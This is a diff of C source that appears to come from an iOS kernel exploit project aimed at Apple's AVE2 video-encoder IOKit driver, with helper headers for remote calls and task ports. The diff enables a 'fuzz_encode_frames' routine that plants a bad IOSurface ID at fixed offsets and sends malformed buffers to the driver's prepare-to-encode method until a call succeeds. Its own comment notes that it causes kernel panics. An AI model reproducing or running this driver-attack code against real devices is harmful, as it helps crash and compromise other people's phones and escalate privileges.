@@ -1,13 +1,12 @@
+
+#include <dirent.h>
 #include "apple_ave_utils.h"
 #include "ziva_iokit.h"
 #include "iosurface_utils.h"
-
 #include "Utilities.h"
-// TODO: Change me
 #include "remote_call.h"
 #include "remote_ports.h"
 #include "task_ports.h"
-
 #include "IOReturn.h"
 /*
  * Function name: 	apple_ave_utils_get_connection
@@ -99,10 +98,11 @@ kern_return_t apple_ave_utils_get_connection(io_connect_t * conn_out) {
 
 kern_return_t apple_ave_utils_add_client(io_connect_t conn) {
 	kern_return_t ret = KERN_SUCCESS;
-	char input_buffer[IOKIT_ADD_CLIENT_INPUT_BUFFER_SIZE] = {0};
+	char input_buffer[OFFSET(add_client_input_buffer_size)];
 	size_t output_buffer_size = IOKIT_ADD_CLIENT_OUTPUT_BUFFER_SIZE;
 	char output_buffer[output_buffer_size];
 
+    bzero(input_buffer, sizeof(input_buffer));
 	memset(output_buffer, 0, output_buffer_size);
 
 	ret = IOConnectCallMethod(conn,
@@ -111,6 +111,11 @@ kern_return_t apple_ave_utils_add_client(io_connect_t conn) {
 		input_buffer, sizeof(input_buffer),
 		NULL, 0,
 		output_buffer, &output_buffer_size);
+
+    if(ret != KERN_SUCCESS) {
+        printf("[ERROR]: adding client (error code: %X)\n", ret);
+        return KERN_ABORTED;
+    }
 
 	return ret;
 }
@@ -165,31 +170,64 @@ kern_return_t apple_ave_utils_encode_frame(io_connect_t conn, void * input_buffe
 
 // Don't use this unless you want kernel panics
 void fuzz_encode_frames(io_connect_t conn, uint32_t bad_surface, uint32_t surface_id) {
-//
-//    for(uint64_t i = 59; i <= 75; i++) {
-//
-//        char cinput_buffer[0x650];
-//        char coutput_buffer[0x130];
-//        size_t coutput_buffer_size = sizeof(coutput_buffer);
-//
-//        bzero(cinput_buffer, sizeof(cinput_buffer));
-//        bzero(coutput_buffer, sizeof(coutput_buffer));
-//
-//        printf("[TRYING]: 0x%llx\n", 0x1a4c9 + i);
-//
-//
-//        for(uint64_t j = 0; j <= sizeof(cinput_buffer); j++) {
-//            cinput_buffer[j] = 0x1a4c9 + i;
-//        }
-//
-//
-//
+    
+    char input_buffer[0x650];
+    char output_buffer[0x130];
+    size_t output_buffer_size = sizeof(output_buffer);
+    
+    bzero(input_buffer, sizeof(input_buffer));
+    bzero(output_buffer, sizeof(output_buffer));
+    
+    kern_return_t ret = KERN_ABORTED;
+    
+    
+    printf("[INFO]: BAD SURFACE IS: %x\n", bad_surface);
+    
+    input_buffer[0xd8] = bad_surface;
+    input_buffer[0xe8] = bad_surface;
+    input_buffer[0xC] = surface_id;
+    input_buffer[0x1C] = bad_surface;
+    
+    ret = IOConnectCallMethod(conn,
+                              APPLEAVE2_EXTERNAL_METHOD_PREPARE_TO_ENCODE_FRAMES,
+                              NULL, 0, input_buffer,
+                              0x650,
+                              NULL, 0,
+                              output_buffer, &output_buffer_size);
+    
+    printf("[kernel DONE]: ------------------------------------\n");
+    
+    for(uint64_t i = 59; i <= 75; i++) {
+        
+        char cinput_buffer[0x650];
+        char coutput_buffer[0x130];
+        size_t coutput_buffer_size = sizeof(coutput_buffer);
+        
+        bzero(cinput_buffer, sizeof(cinput_buffer));
+        bzero(coutput_buffer, sizeof(coutput_buffer));
+        
+        //        printf("[TRYING]: 0x%llx\n", 0x1a4c9 + i);
+        
+        
+        for(uint64_t j = 0; j <= sizeof(cinput_buffer); j++) {
+            cinput_buffer[j] = 0x1a4c9 + i;
+        }
+        
+        
+        
+//        
 //        cinput_buffer[0xd8] = 0x1a4c9 + 59;
 //        cinput_buffer[0xe8] = 0x1a4c9 + 59;
-//        cinput_buffer[0xC] = 8;
-//
-//
+        cinput_buffer[0xC] = 8;
+        
+        // ui16Width
+        cinput_buffer[0x14] = 0x1;
+        //        cinput_buffer[0x14] = 0xC0;
+        
+        
 //        cinput_buffer[0x15] = 0x1a4c9 + 59; // AVEUC ERROR: in->codedOutputBuffer[0] NULL.
+//        
+//        
 //        cinput_buffer[0x16] = 0x1a4c9 + 59;
 //        cinput_buffer[0x17] = 0x1a4c9 + 59; // H264VIDEOENCODER_MAX_NUMER_OF TOTAL_MACROBLOCKS_H6
 //        cinput_buffer[0x18] = 0x1a4c9 + 59;
@@ -201,40 +239,41 @@ void fuzz_encode_frames(io_connect_t conn, uint32_t bad_surface, uint32_t surfac
 //        cinput_buffer[0x84] = 0;
 //        *(unsigned int*)(cinput_buffer + 0x1C) = 0;
 //        *(unsigned int*)(cinput_buffer + 0x84) = 0;
-//        //        cinput_buffer[0x4] = bad_surface;
-//        //        cinput_buffer[0x8] = bad_surface;
-//        //        cinput_buffer[0xE8] = bad_surface;
-//        //        cinput_buffer[0xEC] = bad_surface;
-//
-//
-//
-//        //        cinput_buffer[0x14] = 0x10007ef;
-//
-//
-//        //        for(uint64_t j = 0; j <= 0x10007ef; j++) {
-//        //
-//        //            printf("[INFO]: 0x%llx\n", j);
-//        //
-//        //            cinput_buffer[0x15] = j;
-//        ret = IOConnectCallMethod(conn,
-//                                  APPLEAVE2_EXTERNAL_METHOD_PREPARE_TO_ENCODE_FRAMES,
-//                                  NULL, 0, cinput_buffer,
-//                                  0x650,
-//                                  NULL, 0,
-//                                  coutput_buffer, &coutput_buffer_size);
-//
-//        if(ret == KERN_SUCCESS) {
-//            printf("[INFO]: success with cinput_buffer[j]\n");
-//            break;
-//        }
-//
-//        //        }
-//
-//        if(ret == KERN_SUCCESS) {
-//            printf("[INFO]: success with cinput_buffer[j]\n");
-//            break;
-//        }
-//    }
+        //        cinput_buffer[0x4] = bad_surface;
+        //        cinput_buffer[0x8] = bad_surface;
+        //        cinput_buffer[0xE8] = bad_surface;
+        //        cinput_buffer[0xEC] = bad_surface;
+        
+        
+        
+        //        cinput_buffer[0x14] = 0x10007ef;
+        //                *(unsigned int*)(cinput_buffer + 0x14) = 0x10007ef;
+        
+        
+        //        for(uint64_t j = 0; j <= 0x10007ef; j++) {
+        //
+        //            printf("[USINNNNG]: 0x%llx\n", j);
+        //
+        //            cinput_buffer[0x15] = j;
+        ret = IOConnectCallMethod(conn,
+                                  APPLEAVE2_EXTERNAL_METHOD_PREPARE_TO_ENCODE_FRAMES,
+                                  NULL, 0, cinput_buffer,
+                                  0x650,
+                                  NULL, 0,
+                                  coutput_buffer, &coutput_buffer_size);
+        
+        if(ret == KERN_SUCCESS) {
+            printf("[SUCCESS]: IT WORKED. W00T. with cinput_buffer[j]\n");
+            break;
+        }
+        
+        //        }
+        
+        if(ret == KERN_SUCCESS) {
+            printf("[SUCCESS]: IT WORKED. W00T. with cinput_buffer[j]\n");
+            break;
+        }
+    }
     
 }
 
@@ -249,21 +288,22 @@ kern_return_t apple_ave_utils_prepare_to_encode_frames(io_connect_t conn, void *
 	kern_return_t ret = KERN_ABORTED;
 	size_t output_buffer_size = OFFSET(encode_frame_output_buffer_size);
     
-    printf("[INFO]: apple_ave_utils_prepare_to_encode_frames preparing to encode frames for connection\n");
+    printf("[INFO]: preparing to encode frames for connection\n");
     
+
     ret = IOConnectCallMethod(conn,
         APPLEAVE2_EXTERNAL_METHOD_PREPARE_TO_ENCODE_FRAMES,
         NULL, 0, input_buffer,
         OFFSET(encode_frame_input_buffer_size),
         NULL, 0,
         output_buffer, &output_buffer_size);
-    
+
     if(ret != KERN_SUCCESS) {
         printf("[ERROR]: Prepare to encode frame (error code: %X)\n", ret);
         return KERN_ABORTED;
     }
 
-	return ret;	
+	return ret;
 }
 
 /*
@@ -276,24 +316,25 @@ kern_return_t apple_ave_utils_set_session_settings(io_connect_t conn, void * inp
 	
 	kern_return_t ret = KERN_SUCCESS;
     char output_buffer_local[OFFSET(encode_frame_output_buffer_size)];
-
-    bzero(input_buffer, sizeof(input_buffer));
-
 	size_t output_buffer_size = sizeof(output_buffer_local);
 
+//    sleep(8); // just for testing
 
-	ret = IOConnectCallMethod(conn,
+    ret = IOConnectCallMethod(conn,
 		APPLEAVE2_EXTERNAL_METHOD_SET_SESSION_SETTINGS,
 		NULL, 0,
 		input_buffer, OFFSET(encode_frame_input_buffer_size),
 		NULL, 0,
 		output_buffer_local, &output_buffer_size);
 
-	if (output_buffer && KERN_SUCCESS == ret)
-	{
+	if (output_buffer && KERN_SUCCESS == ret) {
 		memcpy(output_buffer, output_buffer_local, sizeof(output_buffer_local));
 	}
 
+    if(ret != KERN_SUCCESS) {
+        printf("[ERROR]: setting session settings (error code: %X)\n", ret);
+        return KERN_ABORTED;
+    }
 	return ret;
 }
 
